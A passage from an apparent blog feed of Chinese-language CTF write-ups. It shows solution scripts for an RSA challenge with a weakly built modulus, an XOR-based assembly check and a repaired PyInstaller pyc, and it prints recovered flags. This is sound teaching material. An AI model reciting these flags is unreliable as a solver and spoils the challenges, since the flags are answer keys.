punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h4 id=\"签到确信\"><a class=\"markdownIt-Anchor\" href=\"#签到确信\">#</a> 签到，确信！</h4>\n<p>未出但写</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> enc <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">gen_keys</span><span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        q <span class=\"token operator\">=</span> <span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>p<span class=\"token operator\">**</span>i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> isPrime<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            r <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q<span class=\"token operator\">*</span>r</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">,</span>n</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">,</span>n <span class=\"token operator\">=</span> gen_keys<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"n = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"e = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>e<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"c = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">8361361624563191168612863710516449028280757632934603412143152925186847721821552879338608951120157631182699762833743097837368740526055736516080136520584848113137087581886426335191207688807063024096128001406698217998816782335655663803544853496060418931569545571397849643826584234431049002394772877263603049736723071392989824939202362631409164434715938662038795641314189628730614978217987868150651491343161526447894569241770090377633602058561239329450046036247193745885174295365633411482121644408648089046016960479100220850953009927778950304754339013541019536413880264074456433907671670049288317945540495496615531150916647050158936010095037412334662561046016163777575736952349827380039938526168715655649566952708788485104126900723003264019513888897942175890007711026288941687256962012799264387545892832762304320287592575602683673845399984039272350929803217492617502601005613778976109701842829008365226259492848134417818535629827769342262020775115695472218876430557026471282526042545195944063078523279341459199475911203966762751381334277716236740637021416311325243028569997303341317394525345879188523948991698489667794912052436245063998637376874151553809424581376068719814532246179297851206862505952437301253313660876231136285877214949094995458997630235764635059528016149006613720287102941868517244509854875672887445099733909912598895743707420454623997740143407206090319567531144126090072331</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">990174418341944658163682355081485155265287928299806085314916265580657672513493698560580484907432207730887132062242640756706695937403268682912083148568866147011247510439837340945334451110125182595397920602074775022416454918954623612449584637584716343806255917090525904201284852578834232447821716829253065610989317909188784426328951520866152936279891872183954439348449359491526360671152193735260099077198986264364568046834399064514350538329990985131052947670063605611113730246128926850242471820709957158609175376867993700411738314237400038584470826914946434498322430741797570259936266226325667814521838420733061335969071245580657187544161772619889518845348639672820212709030227999963744593715194928502606910452777687735614033404646237092067644786266390652682476817862879933305687452549301456541574678459748029511685529779653056108795644495442515066731075232130730326258404497646551885443146629498236191794065050199535063169471112533284663197357635908054343683637354352034115772227442563180462771041527246803861110504563589660801224223152060573760388045791699221007556911597792387829416892037414283131499832672222157450742460666013331962249415807439258417736128976044272555922344342725850924271905056434303543500959556998454661274520986141613977331669376614647269667276594163516040422089616099849315644424644920145900066426839607058422686565517159251903275091124418838917480242517812783383</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>k <span class=\"token operator\">=</span> <span class=\"token number\">7</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>R <span class=\"token operator\">=</span> Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"x\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    Q <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>quo<span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">.</span>random_element<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    pp1 <span class=\"token operator\">=</span> gcd<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>Q<span class=\"token punctuation\">.</span>random_element<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span> pp1 <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>pp1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        qq <span class=\"token operator\">=</span> <span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>pp1<span class=\"token operator\">**</span>i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        rr <span class=\"token operator\">=</span> n <span class=\"token operator\">//</span> <span class=\"token punctuation\">(</span>pp1 <span class=\"token operator\">*</span> qq<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">assert</span> n <span class=\"token operator\">==</span> pp1 <span class=\"token operator\">*</span> qq <span class=\"token operator\">*</span> rr</pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">12682901567122222027862267249598083531042605533994291954963094692106317834600627170541482405569672263127679934367189535951903117852500278279000920954628951</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>p<span class=\"token operator\">**</span>i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>r <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>p<span class=\"token operator\">//</span>q </pre></td></tr><tr><td data-num=\"39\"></td><td><pre>d <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>r<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>flag <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">#b'SICTF&#123;d9428fc7-fa3a-4096-8ec9-191c0a4562ff&#125;'</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">#原文链接：https://blog.csdn.net/m0_62584492/article/details/134758030</span></pre></td></tr></table></figure><h3 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> RE</h3>\n<h4 id=\"gamebattle-city\"><a class=\"markdownIt-Anchor\" href=\"#gamebattle-city\">#</a> Game[Battle City]</h4>\n<p>打游戏出的，二维码就在那个文件夹中</p>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/02/05/hgame-week1-wp/",
            "url": "https://yhuanhuan01.github.io/2024/02/05/hgame-week1-wp/",
            "title": "hgame-week1-wp",
            "date_published": "2024-02-05T14:56:17.000Z",
            "content_html": "<h1 id=\"hgame_wp_week1\"><a class=\"markdownIt-Anchor\" href=\"#hgame_wp_week1\">#</a> Hgame_wp_week1</h1>\n<p><img data-src=\"/img/Hgame_wp_week1/image-20240204145551962.png\" alt=\"image-20240204145551962\"></p>\n<p><img data-src=\"/img/Hgame_wp_week1/image-20240205175025173.png\" alt=\"image-20240205175025173\"></p>\n<h2 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> RE</h2>\n<h3 id=\"ezasm100pt\"><a class=\"markdownIt-Anchor\" href=\"#ezasm100pt\">#</a> ezASM(100pt)</h3>\n<blockquote>\n<p>To learn a little ASM</p>\n</blockquote>\n<p>题目：</p>\n<pre><code class=\"language-assembly\">section .data\n    c db 74, 69, 67, 79, 71, 89, 99, 113, 111, 125, 107, 81, 125, 107, 79, 82, 18, 80, 86, 22, 76, 86, 125, 22, 125, 112, 71, 84, 17, 80, 81, 17, 95, 34\n    flag db 33 dup(0)\n    format db &quot;plz input your flag: &quot;, 0\n    success db &quot;Congratulations!&quot;, 0\n    failure db &quot;Sry, plz try again&quot;, 0\n\nsection .text\n    global _start\n\n_start:\n    ; Print prompt\n    mov eax, 4\n    mov ebx, 1\n    mov ecx, format\n    mov edx, 20\n    int 0x80\n\n    ; Read user input\n    mov eax, 3\n    mov ebx, 0\n    mov ecx, flag\n    mov edx, 33\n    int 0x80\n\n    ; Check flag\n    xor esi, esi\ncheck_flag:\n    mov al, byte [flag + esi]\n    xor al, 0x22\n    cmp al, byte [c + esi]\n    jne failure_check\n\n    inc esi\n    cmp esi, 33\n    jne check_flag\n\n    ; Print success message\n    mov eax, 4\n    mov ebx, 1\n    mov ecx, success\n    mov edx, 14\n    int 0x80\n\n    ; Exit\n    mov eax, 1\n    xor ebx, ebx\n    int 0x80\n\nfailure_check:\n    ; Print failure message\n    mov eax, 4\n    mov ebx, 1\n    mov ecx, failure\n    mov edx, 18\n    int 0x80\n\n    ; Exit\n    mov eax, 1\n    xor ebx, ebx\n    int 0x80\n\n</code></pre>\n<p>解题思路：</p>\n<blockquote>\n<p>; Check flag<br>\nxor esi, esi<br>\ncheck_flag:<br>\nmov al, byte [flag + esi]<br>\nxor al, 0x22<br>\ncmp al, byte [c + esi]<br>\njne failure_check</p>\n</blockquote>\n<p>检测用户输入与 0x22 异或然后与 c 进行比较</p>\n<p>即 c [i] 与 0x22 异或之后得到的为 flag 内容。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">89</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">113</span><span class=\"token punctuation\">,</span> <span class=\"token number\">111</span><span class=\"token punctuation\">,</span> <span class=\"token number\">125</span><span class=\"token punctuation\">,</span> <span class=\"token number\">107</span><span class=\"token punctuation\">,</span> <span class=\"token number\">81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">125</span><span class=\"token punctuation\">,</span> <span class=\"token number\">107</span><span class=\"token punctuation\">,</span> <span class=\"token number\">79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">125</span><span class=\"token punctuation\">,</span> <span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">125</span><span class=\"token punctuation\">,</span> <span class=\"token number\">112</span><span class=\"token punctuation\">,</span> <span class=\"token number\">71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">84</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>x <span class=\"token operator\">=</span> <span class=\"token number\">0x22</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    tmp <span class=\"token operator\">=</span> c<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> x</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    flag<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote ASM\\_Is\\_Imp0rt4nt\\_4\\_Rev3rs3\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h3 id=\"ezpyc100pt\"><a class=\"markdownIt-Anchor\" href=\"#ezpyc100pt\">#</a> ezPYC(100pt)</h3>\n<blockquote>\n<p>ez python Reverse</p>\n</blockquote>\n<p>这题目做了好久，结果是 pyc 的文件头错误，因为用 &quot;<span class=\"exturl\" data-url=\"aHR0cDovL3B5aW5zdHh0cmFjdG9yLnB5\">pyinstxtractor.py</span>&quot; 解包后，在库文件中 pyc 的文件头也是错误的。</p>\n<p>解题思路：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python pyinstxtractor.py ezPYC.exe</pre></td></tr></table></figure><p>在目录文件夹中解包出下面文件夹</p>\n<blockquote>\n<p>ezPYC.exe_extracted</p>\n</blockquote>\n<p>找到 ezPYC 二进制文件</p>\n<p>进行修改文件头操作</p>\n<blockquote>\n<p>55 0D 0D 0A 00 00 00 00 00 00 00 00 00 00 00 00</p>\n</blockquote>\n<p>加到 E3 之前即可。</p>\n<p>然后进行 pyc 反编译</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pycdc.exe ezPYC.pyc <span class=\"token operator\">></span> <span class=\"token number\">2</span>.txt</pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># Source Generated with Decompyle++</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># File: ezPYC.pyc (Python 3.8)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token number\">87</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token number\">75</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token number\">71</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token number\">69</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token number\">83</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token number\">121</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token number\">83</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token number\">125</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token number\">117</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token number\">106</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token number\">108</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token number\">106</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token number\">94</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token number\">80</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token number\">48</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token number\">114</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token number\">100</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token number\">55</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token number\">94</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token number\">51</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token number\">91</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token number\">48</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token number\">108</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token number\">119</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token number\">97</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token number\">115</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token number\">49</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token number\">48</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token number\">108</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token number\">100</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token number\">124</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token number\">2</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token number\">3</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token builtin\">input</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'plz input flag:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> c<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Sry, try again...'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Wow!You know a little of python reverse'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">None</span></pre></td></tr></table></figure><p>exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">87</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">75</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token number\">71</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token number\">69</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token number\">83</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token number\">121</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token number\">83</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token number\">125</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token number\">117</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token number\">106</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token number\">108</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token number\">106</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token number\">94</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token number\">80</span><span class=\"token 